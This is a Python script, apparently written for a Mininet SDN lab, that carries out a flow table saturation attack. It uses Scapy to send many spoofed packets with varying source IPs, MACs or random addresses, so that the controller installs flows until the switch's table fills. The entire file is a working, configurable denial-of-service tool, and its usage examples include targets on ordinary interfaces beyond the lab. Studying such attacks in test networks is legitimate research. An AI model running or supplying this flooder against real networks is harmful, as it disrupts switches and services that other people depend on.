#!/usr/bin/env python3
"""
Flow Table Saturation Attack Script
====================================

This script simulates a flow table saturation attack by generating many
packets with different source and destination IP/MAC addresses.

Each unique packet combination will trigger a PacketIn message at the controller,
and cause a new flow to be installed in the switch's flow table.

By generating enough unique flows, we can fill the switch's flow table
and demonstrate the impact on network performance.

Usage:
    # From a host in the Mininet network:
    h1 # Enter h1's terminal
    cd /tmp  # Or wherever this script is located
    python3 attack_script.py -i h1-eth0 -d 10.0.0.2 -n 1000

Or run from the host command line:
    python3 attack_script.py --help  # For help

Requirements:
    - Scapy: pip install scapy
    - Run with root/sudo privileges
    - Must run on a host that can reach the target
"""

import argparse
import logging
import time
import sys
from datetime import datetime
from scapy.all import Ether, IP, TCP, send, RandMAC, RandIP, get_if_hwaddr, conf
from scapy.layers.l2 import ARP

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
LOG = logging.getLogger(__name__)

class FlowTableAttack:
    """
    Flow Table Saturation Attack
    
    This class handles the generation and sending of attack packets.
    It can generate packets with:
    - Varying source MAC addresses
    - Varying source IP addresses  
    - Varying destination ports
    - Fixed or varying destination
    """

    def __init__(self, interface, target_ip, num_packets=100, 
                 packet_rate=100, attack_type='ip'):
        """
        Initialize the attack
        
        Args:
            interface: Network interface to send from (e.g., 'h1-eth0')
            target_ip: Target IP address
            num_packets: Number of packets to send
            packet_rate: Packets per second to send
            attack_type: 'ip' (varying source IP) or 'mac' (varying source MAC)
        """
        self.interface = interface
        self.target_ip = target_ip
        self.num_packets = num_packets
        self.packet_rate = packet_rate
        self.attack_type = attack_type
        self.packets_sent = 0
        self.packets_failed = 0
        self.start_time = None
        
        # Set the interface for Scapy
        conf.iface = interface
        
        LOG.info(f'Attack initialized: interface={interface}, target={target_ip}, '
                 f'packets={num_packets}, rate={packet_rate}pps, type={attack_type}')

    def generate_attack_packets(self):
        """
        Generate attack packets with varying source addresses
        
        Yields packets to be sent
        """
        src_mac = get_if_hwaddr(self.interface)
        
        for i in range(self.num_packets):
            if self.attack_type == 'ip':
                # Vary source IP address
                # This creates unique flows for each source IP
                src_ip = f'10.0.0.{(i % 254) + 1}'
                pkt = Ether(src=src_mac, dst='ff:ff:ff:ff:ff:ff') / \
                      IP(src=src_ip, dst=self.target_ip, ttl=64) / \
                      TCP(sport=(5000 + i) % 65535, dport=80)
                      
            elif self.attack_type == 'mac':
                # Vary source MAC address
                # This creates unique flows for each source MAC
                varied_mac = f'00:00:00:00:{i // 256:02x}:{i % 256:02x}'
                pkt = Ether(src=varied_mac, dst='ff:ff:ff:ff:ff:ff') / \
                      IP(src='10.0.0.1', dst=self.target_ip) / \
                      TCP(sport=(5000 + i) % 65535, dport=80)
            else:
                # Random variation - completely random IPs and MACs
                pkt = Ether(src=RandMAC(), dst='ff:ff:ff:ff:ff:ff') / \
                      IP(src=RandIP(), dst=self.target_ip) / \
                      TCP(sport=(5000 + i) % 65535, dport=80)
            
            yield pkt

    def execute_attack(self):
        """
        Execute the attack by sending packets at specified rate
        """
        self.start_time = time.time()
        LOG.info(f'Starting attack: sending {self.num_packets} packets '
                 f'at {self.packet_rate} pps...')
        
        packet_interval = 1.0 / self.packet_rate  # Time between packets
        
        try:
            for i, pkt in enumerate(self.generate_attack_packets()):
                try:
                    # Send the packet
                    send(pkt, verbose=0)
                    self.packets_sent += 1
                    
                    # Print progress every 100 packets
                    if (i + 1) % 100 == 0:
                        elapsed = time.time() - self.start_time
                        rate = self.packets_sent / elapsed
                        LOG.info(f'Progress: {self.packets_sent}/{self.num_packets} '
                                 f'packets sent ({rate:.1f} pps, elapsed: {elapsed:.1f}s)')
                    
                    # Rate limiting - sleep to maintain packet rate
                    time.sleep(packet_interval)
                    
                except Exception as e:
                    self.packets_failed += 1
                    LOG.warning(f'Failed to send packet {i+1}: {e}')
        
        except KeyboardInterrupt:
            LOG.warning('Attack interrupted by user')
        
        except Exception as e:
            LOG.error(f'Attack error: {e}')
        
        finally:
            self.print_summary()

    def print_summary(self):
        """
        Print attack summary statistics
        """
        elapsed = time.time() - self.start_time
        success_rate = (self.packets_sent / self.num_packets * 100) if self.num_packets > 0 else 0
        actual_rate = self.packets_sent / elapsed if elapsed > 0 else 0
        
        LOG.info('='*60)
        LOG.info('ATTACK SUMMARY REPORT')
        LOG.info('='*60)
        LOG.info(f'Total packets sent: {self.packets_sent}/{self.num_packets}')
        LOG.info(f'Packets failed: {self.packets_failed}')
        LOG.info(f'Success rate: {success_rate:.1f}%')
        LOG.info(f'Total time: {elapsed:.2f} seconds')
        LOG.info(f'Average rate: {actual_rate:.1f} packets/sec')
        LOG.info(f'Attack type: {self.attack_type} variation')
        LOG.info(f'Target: {self.target_ip}')
        LOG.info('='*60)

def main():
    """
    Main function - parse arguments and execute attack
    """
    parser = argparse.ArgumentParser(
        description='Flow Table Saturation Attack - Flood SDN switch with unique flows',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  sudo python3 attack_script.py -i h1-eth0 -d 10.0.0.2
  sudo python3 attack_script.py -i eth0 -d 192.168.1.1 -n 5000 -r 500
  sudo python3 attack_script.py -i eth0 -d 10.0.0.2 -t mac -n 2000
        '''
    )
    
    parser.add_argument('-i', '--interface', required=True,
                        help='Network interface to send from (e.g., h1-eth0, eth0)')
    parser.add_argument('-d', '--destination', required=True,
                        help='Target IP address (e.g., 10.0.0.2)')
    parser.add_argument('-n', '--num-packets', type=int, default=1000,
                        help='Number of packets to send (default: 1000)')
    parser.add_argument('-r', '--rate', type=int, default=100,
                        help='Packet rate in packets/second (default: 100)')
    parser.add_argument('-t', '--type', choices=['ip', 'mac', 'random'],
                        default='ip',
                        help='Attack type: vary source IP (ip), MAC (mac), or both (random)')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Enable verbose output')
    
    args = parser.parse_args()
    
    # Set log level based on verbose flag
    if args.verbose:
        LOG.setLevel(logging.DEBUG)
    
    # Validate inputs
    if args.num_packets <= 0:
        LOG.error('Number of packets must be greater than 0')
        sys.exit(1)
    
    if args.rate <= 0:
        LOG.error('Packet rate must be greater than 0')
        sys.exit(1)
    
    # Create and execute attack
    attack = FlowTableAttack(
        interface=args.interface,
        target_ip=args.destination,
        num_packets=args.num_packets,
        packet_rate=args.rate,
        attack_type=args.type
    )
    
    attack.execute_attack()

if __name__ == '__main__':
    main()
